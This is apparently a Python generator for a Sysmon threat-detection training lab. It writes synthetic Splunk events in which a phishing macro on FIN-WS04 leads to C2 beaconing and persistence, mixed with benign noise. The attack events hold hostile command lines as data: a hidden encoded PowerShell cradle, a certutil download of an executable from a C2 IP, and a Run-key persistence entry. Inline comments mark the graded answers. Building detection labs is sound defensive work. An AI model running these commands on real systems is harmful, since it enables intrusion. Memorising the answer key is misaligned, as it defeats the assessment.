#!/usr/bin/env python3
"""
generate_data.py — Sysmon for Threat Detection lab
===================================================
Produces a single JSON ARRAY of flat Sysmon event objects for index='sysmon'
(sourcetype='Sysmon'). The setup.sh converts the array to NDJSON so Splunk
indexes each record as its own event (counts are exact).

DESIGNED ATTACK SCENARIO (deterministic, seeded)
-------------------------------------------------
A phishing macro on workstation FIN-WS04 (user CORP\\dharris) kicks off a
living-off-the-land intrusion mapped to MITRE ATT&CK:

  1. EventID 1  : WINWORD.EXE spawns cmd.exe -> powershell.exe (encoded)
                  -> certutil.exe (LOLBin) downloads payload to %TEMP%.
                  (T1059.001 / T1105 / LOLBin abuse)
  2. EventID 22 : powershell.exe + the dropped payload beacon to a DGA-style
                  C2 domain with a long random subdomain. (T1071.004 DNS C2)
  3. EventID 3  : the dropped payload (svchost32.exe) makes outbound network
                  connections to the C2 IP on non-standard port 4444.
                  (T1571 non-standard port / C2)
  4. EventID 11 : certutil + powershell drop .exe/.dll files into %TEMP%.
                  (T1105 ingress tool transfer)
  5. EventID 13 : the payload writes an HKCU ...\\CurrentVersion\\Run value
                  for persistence pointing at the dropped exe.
                  (T1547.001 Registry Run Key persistence)

The C2 IP, C2 port, persistence Run-key value, LOLBin, and DGA domain are all
single-answer facts the 6 graded tasks resolve to. Plenty of benign noise
surrounds the signal across several workstations + servers.
"""
import json
import os
import random
import datetime

OUTDIR = os.path.dirname(os.path.abspath(__file__))
random.seed(20260608)

# ── designed-scenario IOCs (single-answer facts) ─────────────────────────────
VICTIM        = "FIN-WS04"
VICTIM_USER   = "CORP\\dharris"
C2_IP         = "194.165.16.77"          # answer: malicious DestinationIp
C2_PORT       = 4444                      # answer: non-standard C2 port
LOLBIN        = "certutil.exe"            # answer: LOLBin used to download
DROPPED_EXE   = "C:\\Users\\dharris\\AppData\\Local\\Temp\\svchost32.exe"
DROPPED_DLL   = "C:\\Users\\dharris\\AppData\\Local\\Temp\\wininet32.dll"
RUN_KEY       = "HKU\\S-1-5-21-1004336348-1177238915-682003330-1107\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate"  # answer: TargetObject
RUN_VALUE     = DROPPED_EXE               # answer: Details (persistence payload path)
# DGA / C2 DNS domain (long subdomain -> >50 char QueryName)  answer: QueryName
DGA_DOMAIN    = "a7f3c9e1b4d28f6a0c5e7b91d3f8a2c6.update-telemetry-cdn.net"

base_time = datetime.datetime(2026, 6, 7, 0, 0, 0)

HOSTS = ["FIN-WS04", "HR-WS02", "IT-WS07", "ENG-WS11", "DC01", "FILE01", "WEB01"]
USERS = ["CORP\\dharris", "CORP\\mkhan", "CORP\\jlopez", "CORP\\rsingh",
         "CORP\\twong", "CORP\\bcarter", "NT AUTHORITY\\SYSTEM",
         "NT AUTHORITY\\LOCAL SERVICE", "NT AUTHORITY\\NETWORK SERVICE"]

events = []


def ts(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%S.000Z")


def add(ev):
    events.append(ev)


# Mostly-benign images and the parents that normally spawn them
BENIGN_IMAGES = [
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Windows\\System32\\RuntimeBroker.exe",
    "C:\\Windows\\System32\\taskhostw.exe",
    "C:\\Windows\\System32\\conhost.exe",
    "C:\\Windows\\System32\\SearchIndexer.exe",
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "C:\\Windows\\System32\\dllhost.exe",
    "C:\\Windows\\System32\\wininit.exe",
    "C:\\Windows\\System32\\lsass.exe",
]
BENIGN_PARENTS = [
    "C:\\Windows\\System32\\services.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\System32\\wininit.exe",
    "C:\\Windows\\System32\\userinit.exe",
]
BENIGN_DOMAINS = [
    "www.microsoft.com", "outlook.office365.com", "clients4.google.com",
    "fonts.gstatic.com", "settings-win.data.microsoft.com",
    "ctldl.windowsupdate.com", "login.microsoftonline.com",
    "teams.microsoft.com", "edge.microsoft.com", "ocsp.digicert.com",
    "api.github.com", "slack.com", "dns.msftncsi.com", "time.windows.com",
]
BENIGN_DST = [
    ("13.107.42.14", 443), ("142.250.72.196", 443), ("20.190.159.4", 443),
    ("23.45.12.88", 443), ("52.96.40.18", 443), ("10.0.0.10", 53),
    ("10.0.0.10", 389), ("10.0.0.10", 445), ("10.0.0.11", 80),
]

# =====================================================================
# SIGNAL — the designed attack chain on FIN-WS04 (CORP\dharris)
# =====================================================================
chain = base_time + datetime.timedelta(hours=14, minutes=23, seconds=10)

# (1) EventID 1 — WINWORD.EXE (phishing macro) spawns cmd.exe
add({
    "EventID": 1, "Computer": VICTIM, "UtcTime": ts(chain), "User": VICTIM_USER,
    "ProcessGuid": "{a1b2c3d4-0001-0000-0000-000000000001}", "ProcessId": 6120,
    "ParentProcessGuid": "{a1b2c3d4-0000-0000-0000-000000000000}", "ParentProcessId": 4880,
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": '"WINWORD.EXE" /n "C:\\Users\\dharris\\Downloads\\Invoice_Mar2026.docm"',
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": 'cmd.exe /c powershell -nop -w hidden -enc SQBFAFgA',
    "IntegrityLevel": "Medium",
    "Hashes": "MD5=D7AB69FAD18D4A643D84A271DFC0DBDF,SHA256=4F5B...",
})
# (2) EventID 1 — cmd.exe spawns powershell.exe (encoded download cradle)
add({
    "EventID": 1, "Computer": VICTIM, "UtcTime": ts(chain + datetime.timedelta(seconds=2)),
    "User": VICTIM_USER,
    "ProcessGuid": "{a1b2c3d4-0002-0000-0000-000000000002}", "ProcessId": 6200,
    "ParentProcessGuid": "{a1b2c3d4-0001-0000-0000-000000000001}", "ParentProcessId": 6120,
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": 'cmd.exe /c powershell -nop -w hidden -enc SQBFAFgA',
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
    "IntegrityLevel": "Medium",
    "Hashes": "MD5=097CE5761C89434367598B34FE32893B,SHA256=9F1C...",
})
# (3) EventID 1 — powershell.exe spawns certutil.exe (LOLBin download to %TEMP%)
add({
    "EventID": 1, "Computer": VICTIM, "UtcTime": ts(chain + datetime.timedelta(seconds=9)),
    "User": VICTIM_USER,
    "ProcessGuid": "{a1b2c3d4-0003-0000-0000-000000000003}", "ProcessId": 6320,
    "ParentProcessGuid": "{a1b2c3d4-0002-0000-0000-000000000002}", "ParentProcessId": 6200,
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA",
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": f"certutil.exe -urlcache -split -f http://{C2_IP}/svchost32.exe {DROPPED_EXE}",
    "IntegrityLevel": "Medium",
    "Hashes": "MD5=A4F2C8D3E9B17654A2C1D0E8F3B9A7C6,SHA256=1B2C...",
})
# (4) EventID 11 — certutil drops the payload EXE into %TEMP%
add({
    "EventID": 11, "Computer": VICTIM, "UtcTime": ts(chain + datetime.timedelta(seconds=11)),
    "User": VICTIM_USER,
    "ProcessGuid": "{a1b2c3d4-0003-0000-0000-000000000003}", "ProcessId": 6320,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "TargetFilename": DROPPED_EXE,
    "CreationUtcTime": ts(chain + datetime.timedelta(seconds=11)),
})
# (5) EventID 11 — powershell drops a helper DLL into %TEMP%
add({
    "EventID": 11, "Computer": VICTIM, "UtcTime": ts(chain + datetime.timedelta(seconds=13)),
    "User": VICTIM_USER,
    "ProcessGuid": "{a1b2c3d4-0002-0000-0000-000000000002}", "ProcessId": 6200,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "TargetFilename": DROPPED_DLL,
    "CreationUtcTime": ts(chain + datetime.timedelta(seconds=13)),
})
# (6) EventID 1 — the dropped payload executes
add({
    "EventID": 1, "Computer": VICTIM, "UtcTime": ts(chain + datetime.timedelta(seconds=16)),
    "User": VICTIM_USER,
    "ProcessGuid": "{a1b2c3d4-0004-0000-0000-000000000004}", "ProcessId": 6480,
    "ParentProcessGuid": "{a1b2c3d4-0002-0000-0000-000000000002}", "ParentProcessId": 6200,
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA",
    "Image": DROPPED_EXE,
    "CommandLine": "svchost32.exe",
    "IntegrityLevel": "Medium",
    "Hashes": "MD5=B5E3D9F4A0C28765B3D2E1F9A4C0B8D7,SHA256=2C3D...",
})
# (7) EventID 13 — payload writes HKCU Run key persistence (T1547.001)
add({
    "EventID": 13, "Computer": VICTIM, "UtcTime": ts(chain + datetime.timedelta(seconds=18)),
    "User": VICTIM_USER,
    "ProcessGuid": "{a1b2c3d4-0004-0000-0000-000000000004}", "ProcessId": 6480,
    "Image": DROPPED_EXE,
    "EventType": "SetValue",
    "TargetObject": RUN_KEY,
    "Details": RUN_VALUE,
})
# (8) EventID 22 — DNS query to the DGA C2 domain (long subdomain) from powershell
add({
    "EventID": 22, "Computer": VICTIM, "UtcTime": ts(chain + datetime.timedelta(seconds=20)),
    "User": VICTIM_USER,
    "ProcessGuid": "{a1b2c3d4-0002-0000-0000-000000000002}", "ProcessId": 6200,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "QueryName": DGA_DOMAIN,
    "QueryStatus": "0",
    "QueryResults": f"type:  5 {C2_IP};",
})
# (9) repeated beacon DNS queries to the same DGA domain from the payload (5 more)
for i in range(5):
    add({
        "EventID": 22, "Computer": VICTIM,
        "UtcTime": ts(chain + datetime.timedelta(seconds=60 + i * 60)),
        "User": VICTIM_USER,
        "ProcessGuid": "{a1b2c3d4-0004-0000-0000-000000000004}", "ProcessId": 6480,
        "Image": DROPPED_EXE,
        "QueryName": DGA_DOMAIN,
        "QueryStatus": "0",
        "QueryResults": f"type:  5 {C2_IP};",
    })
# (10) EventID 3 — payload makes outbound C2 connections to non-standard port 4444
for i in range(12):
    add({
        "EventID": 3, "Computer": VICTIM,
        "UtcTime": ts(chain + datetime.timedelta(seconds=24 + i * 60 + random.randint(-4, 4))),
        "User": VICTIM_USER,
        "ProcessGuid": "{a1b2c3d4-0004-0000-0000-000000000004}", "ProcessId": 6480,
        "Image": DROPPED_EXE,
        "Protocol": "tcp", "Initiated": "true",
        "SourceIp": "10.0.0.84", "SourcePort": random.randint(49152, 65535),
        "DestinationIp": C2_IP, "DestinationPort": C2_PORT,
        "DestinationHostname": "",
    })

# =====================================================================
# NOISE — benign Sysmon events across all 5 EventIDs and several hosts
# =====================================================================

# Benign EventID 1 — process creation
for _ in range(900):
    offset = random.randint(0, 86400 * 2)
    t = base_time + datetime.timedelta(seconds=offset)
    img = random.choice(BENIGN_IMAGES)
    add({
        "EventID": 1, "Computer": random.choice(HOSTS), "UtcTime": ts(t),
        "User": random.choice(USERS),
        "ProcessGuid": "{%08x-0000-0000-0000-000000000000}" % random.randint(0, 0xFFFFFFFF),
        "ProcessId": random.randint(800, 9999),
        "ParentProcessGuid": "{%08x-0000-0000-0000-000000000000}" % random.randint(0, 0xFFFFFFFF),
        "ParentProcessId": random.randint(400, 3000),
        "ParentImage": random.choice(BENIGN_PARENTS),
        "ParentCommandLine": "",
        "Image": img,
        "CommandLine": img.split("\\")[-1],
        "IntegrityLevel": random.choice(["System", "High", "Medium"]),
        "Hashes": "MD5=%032X" % random.randint(0, 1 << 127),
    })

# Benign EventID 3 — network connections to standard ports
for _ in range(700):
    offset = random.randint(0, 86400 * 2)
    t = base_time + datetime.timedelta(seconds=offset)
    dip, dport = random.choice(BENIGN_DST)
    add({
        "EventID": 3, "Computer": random.choice(HOSTS), "UtcTime": ts(t),
        "User": random.choice(USERS),
        "ProcessGuid": "{%08x-0000-0000-0000-000000000000}" % random.randint(0, 0xFFFFFFFF),
        "ProcessId": random.randint(800, 9999),
        "Image": random.choice([
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
            "C:\\Windows\\System32\\backgroundTaskHost.exe",
        ]),
        "Protocol": "tcp", "Initiated": "true",
        "SourceIp": "10.0.0.%d" % random.randint(20, 200),
        "SourcePort": random.randint(49152, 65535),
        "DestinationIp": dip, "DestinationPort": dport,
        "DestinationHostname": "",
    })

# Benign EventID 11 — file creation outside Temp / non-executable
for _ in range(400):
    offset = random.randint(0, 86400 * 2)
    t = base_time + datetime.timedelta(seconds=offset)
    who = random.choice(["dharris", "mkhan", "jlopez", "rsingh"])
    fn = random.choice([
        "C:\\Users\\{u}\\Documents\\report.docx",
        "C:\\Users\\{u}\\Downloads\\setup.log",
        "C:\\ProgramData\\Microsoft\\Windows\\Caches\\cache.dat",
        "C:\\Users\\{u}\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm",
        "C:\\Windows\\Temp\\MpCmdRun.log",
    ]).replace("{u}", who)
    add({
        "EventID": 11, "Computer": random.choice(HOSTS), "UtcTime": ts(t),
        "User": random.choice(USERS),
        "ProcessGuid": "{%08x-0000-0000-0000-000000000000}" % random.randint(0, 0xFFFFFFFF),
        "ProcessId": random.randint(800, 9999),
        "Image": random.choice([
            "C:\\Windows\\explorer.exe",
            "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "C:\\Windows\\System32\\svchost.exe",
        ]),
        "TargetFilename": fn,
        "CreationUtcTime": ts(t),
    })

# Benign EventID 13 — registry sets NOT in a Run key
for _ in range(300):
    offset = random.randint(0, 86400 * 2)
    t = base_time + datetime.timedelta(seconds=offset)
    add({
        "EventID": 13, "Computer": random.choice(HOSTS), "UtcTime": ts(t),
        "User": random.choice(USERS),
        "ProcessGuid": "{%08x-0000-0000-0000-000000000000}" % random.randint(0, 0xFFFFFFFF),
        "ProcessId": random.randint(800, 9999),
        "Image": random.choice([
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\Windows\\System32\\services.exe",
            "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
        ]),
        "EventType": "SetValue",
        "TargetObject": random.choice([
            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces",
            "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Scan\\LastScanRun",
            "HKU\\S-1-5-18\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
            "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate",
        ]),
        "Details": random.choice(["DWORD (0x00000001)", "QWORD (0x0000000000000000)", "Binary Data"]),
    })

# Benign EventID 22 — DNS queries to legitimate domains
for _ in range(600):
    offset = random.randint(0, 86400 * 2)
    t = base_time + datetime.timedelta(seconds=offset)
    dom = random.choice(BENIGN_DOMAINS)
    add({
        "EventID": 22, "Computer": random.choice(HOSTS), "UtcTime": ts(t),
        "User": random.choice(USERS),
        "ProcessGuid": "{%08x-0000-0000-0000-000000000000}" % random.randint(0, 0xFFFFFFFF),
        "ProcessId": random.randint(800, 9999),
        "Image": random.choice([
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
            "C:\\Windows\\System32\\backgroundTaskHost.exe",
        ]),
        "QueryName": dom,
        "QueryStatus": "0",
        "QueryResults": "type:  5 %d.%d.%d.%d;" % (
            random.randint(13, 200), random.randint(1, 254),
            random.randint(1, 254), random.randint(1, 254)),
    })

# ── sort by time + write JSON array ──────────────────────────────────────────
events.sort(key=lambda e: e["UtcTime"])
outpath = os.path.join(OUTDIR, "sysmon_events.json")
with open(outpath, "w") as f:
    json.dump(events, f, indent=0)

print(f"[+] Wrote {len(events)} events to {outpath}")

# quick breakdown
from collections import Counter
c = Counter(e["EventID"] for e in events)
print("    EventID breakdown:", dict(sorted(c.items())))
